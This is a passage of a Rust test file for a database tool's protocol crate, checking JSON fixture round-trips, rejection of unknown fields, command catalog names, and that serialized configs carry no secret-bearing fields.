    decode_arguments::<VersionCommand>(&version_request).expect("typed version request");
    assert_eq!(
        serde_json::to_value(&version_request).unwrap(),
        value(version_request_source)
    );

    let status_request_source = include_str!("fixtures/status-request.json");
    let status_request: RequestEnvelope =
        serde_json::from_str(status_request_source).expect("status request must decode");
    decode_arguments::<StatusCommand>(&status_request).expect("typed status request");
    assert_eq!(
        serde_json::to_value(&status_request).unwrap(),
        value(status_request_source)
    );

    let app_open_request_source = include_str!("fixtures/app-open-request.json");
    let app_open_request: RequestEnvelope =
        serde_json::from_str(app_open_request_source).expect("app open request must decode");
    decode_arguments::<AppOpenCommand>(&app_open_request).expect("typed app open request");
    assert_eq!(
        serde_json::to_value(&app_open_request).unwrap(),
        value(app_open_request_source)
    );

    let version_success_source = include_str!("fixtures/version-success.json");
    let version_success: ResponseEnvelope =
        serde_json::from_str(version_success_source).expect("version response must decode");
    let _: VersionResult =
        serde_json::from_value(version_success.result().cloned().unwrap()).unwrap();
    assert_eq!(
        serde_json::to_value(&version_success).unwrap(),
        value(version_success_source)
    );

    let status_success_source = include_str!("fixtures/status-success.json");
    let status_success: ResponseEnvelope =
        serde_json::from_str(status_success_source).expect("status response must decode");
    let _: StatusResult =
        serde_json::from_value(status_success.result().cloned().unwrap()).unwrap();
    assert_eq!(
        serde_json::to_value(&status_success).unwrap(),
        value(status_success_source)
    );

    let app_open_success_source = include_str!("fixtures/app-open-success.json");
    let app_open_success: ResponseEnvelope =
        serde_json::from_str(app_open_success_source).expect("app open response must decode");
    let _: AppOpenResult =
        serde_json::from_value(app_open_success.result().cloned().unwrap()).unwrap();
    assert_eq!(
        serde_json::to_value(&app_open_success).unwrap(),
        value(app_open_success_source)
    );

    for source in [
        include_str!("fixtures/app-open-error.json"),
        include_str!("fixtures/version-error.json"),
        include_str!("fixtures/status-error.json"),
        include_str!("fixtures/policy-blocked.json"),
    ] {
        let response: ResponseEnvelope =
            serde_json::from_str(source).expect("response fixture must decode");
        response.validate().expect("response invariant");
        assert_eq!(serde_json::to_value(&response).unwrap(), value(source));
    }
}

#[test]
fn runtime_discovery_matches_the_secret_free_v1_contract() {
    let source = include_str!("fixtures/runtime-discovery.json");
    let discovery: RuntimeDiscovery =
        serde_json::from_str(source).expect("runtime discovery must decode");
    discovery.validate().expect("runtime discovery invariant");
    assert_eq!(serde_json::to_value(&discovery).unwrap(), value(source));

    let serialized = serde_json::to_string(&discovery).unwrap();
    for forbidden in [
        "token",
        "password",
        "credential",
        "database",
        "workspace",
        "connection",
    ] {
        assert!(!serialized.to_ascii_lowercase().contains(forbidden));
    }
}

#[test]
fn unknown_envelope_and_active_command_fields_fail_closed() {
    let mut fixture = value(include_str!("fixtures/query-plan-request.json"));
    fixture
        .as_object_mut()
        .unwrap()
        .insert("approved".into(), Value::Bool(true));
    assert!(serde_json::from_value::<RequestEnvelope>(fixture).is_err());

    let mut status = value(include_str!("fixtures/status-request.json"));
    status["arguments"]["approved"] = Value::Bool(true);
    let request: RequestEnvelope = serde_json::from_value(status).unwrap();
    assert!(decode_arguments::<StatusCommand>(&request).is_err());

    let future: RequestEnvelope = serde_json::from_value(serde_json::json!({
        "protocolVersion": 1,
        "commandSchemaVersion": 5,
        "requestId": "018f1111-2222-7333-8444-555566667777",
        "command": "future.command",
        "arguments": {"approved": true}
    }))
    .unwrap();
    assert_eq!(future.command, dopedb_protocol::CommandName::Unknown);
}

#[test]
fn command_names_match_the_v17_catalog() {
    let actual = dopedb_protocol::CommandName::ALL
        .into_iter()
        .map(|command| command.as_str())
        .collect::<Vec<_>>();
    let expected: Vec<String> =
        serde_json::from_str(include_str!("fixtures/command-catalog-v17.json")).unwrap();
    assert_eq!(actual, expected);

    let external_config = ExternalAgentConfig {
        schema_version: 1,
        provider: ExternalAgentProvider::Codex,
        project_id: "018f1111-2222-7333-8444-555566667701".parse().unwrap(),
        anchor_connection_id: "018f1111-2222-7333-8444-555566667702".parse().unwrap(),
        resource_scopes: vec![ExternalAgentResourceScope {
            project_environment_id: "018f1111-2222-7333-8444-555566667703".parse().unwrap(),
            authority_connection_id: "018f1111-2222-7333-8444-555566667702".parse().unwrap(),
            connection_ids: vec!["018f1111-2222-7333-8444-555566667702".parse().unwrap()],
            source_ids: Vec::new(),
        }],
        write_connection_id: None,
    };
    assert!(external_config.validate());
    let serialized_external_config = serde_json::to_string(&external_config).unwrap();
    for forbidden in ["password", "token", "credential", "connectionUrl"] {
        assert!(!serialized_external_config.contains(forbidden));
    }
    assert_eq!(
        ExternalAgentConfigCreateCommand::AUTHENTICATION,
        AuthenticationRequirement::None
    );
    assert_eq!(
        ExternalAgentSessionStartCommand::AUTHENTICATION,
        AuthenticationRequirement::None
    );
    assert_eq!(
        ExternalAgentSessionRevokeCommand::AUTHENTICATION,
        AuthenticationRequirement::TerminalSession
    );

    let request: RequestEnvelope = serde_json::from_value(json!({
        "protocolVersion": PROTOCOL_MAX,
        "commandSchemaVersion": COMMAND_SCHEMA_VERSION,
        "requestId": "018f1111-2222-7333-8444-555566667777",
        "authentication": {
            "terminalSessionId": "018faaaa-bbbb-7ccc-8ddd-eeeeeeeeeeee"
        },
        "command": "catalog.search",
        "arguments": {
            "connection": "current",
            "database": "app",
            "query": "user",
            "kinds": ["table"],
            "limit": 20
        }
    }))
    .expect("catalog search request must decode");
    let result = json!({
        "connectionId": "00000000-0000-0000-0000-000000000001",
        "engine": "postgres",
        "database": "app",
        "capturedAt": "2026-07-24T00:00:00Z",
        "fingerprint": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
        "query": "user",
        "totalMatches": 1,
        "truncated": false,
        "matches": [{
            "matchType": "relation",
            "qualifiedName": "app.public.users",
            "object": {
                "catalog": "app",
                "namespace": "public",
                "name": "users",
                "kind": "table"
            },
            "matchedFields": ["deleted_at"]
        }]
    });
    typed_cli_contract::<CatalogSearchCommand>(&request, &result);

    let source_request: RequestEnvelope = serde_json::from_value(json!({
        "protocolVersion": PROTOCOL_MAX,
        "commandSchemaVersion": COMMAND_SCHEMA_VERSION,
        "requestId": "018f1111-2222-7333-8444-555566667778",
        "command": "source.read",
        "arguments": {
            "sourceId": "018faaaa-bbbb-7ccc-8ddd-eeeeeeeeeeee",
            "path": "src/main.ts",
            "lineStart": 1,
            "lineEnd": 200
        }
    }))
    .expect("source read request must decode");
    let source_result = json!({
        "sourceId": "018faaaa-bbbb-7ccc-8ddd-eeeeeeeeeeee",
        "repository": "acme/app",
        "commitSha": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
        "path": "src/main.ts",
        "lineStart": 1,
        "lineEnd": 2,
        "totalLines": 2,
        "truncated": false,
        "text": "export const ready = true;\n"
    });
    typed_cli_contract::<SourceReadCommand>(&source_request, &source_result);
}

#[test]
fn catalog_snapshot_matches_the_v2_golden_contract() {
    let source = include_str!("fixtures/catalog-snapshot-v2.json");
    let snapshot: CatalogSnapshot =
        serde_json::from_str(source).expect("Catalog V2 fixture must decode");

    assert_eq!(snapshot.schema_version(), 2);
    assert!(snapshot.has_canonical_fingerprint());
    assert_eq!(serde_json::to_value(&snapshot).unwrap(), value(source));

    let mut structural_tamper = value(source);
    structural_tamper["relations"][0]["columns"][0]["nativeType"] = Value::from("text");
    assert!(serde_json::from_value::<CatalogSnapshot>(structural_tamper).is_err());

    let mut non_structural_change = value(source);
    non_structural_change["database"] = Value::from("production");
    non_structural_change["relations"][0]["rowEstimate"] = Value::from(43);
    let changed: CatalogSnapshot =
        serde_json::from_value(non_structural_change).expect("display metadata is not schema");
    assert_eq!(changed.fingerprint(), snapshot.fingerprint());
}
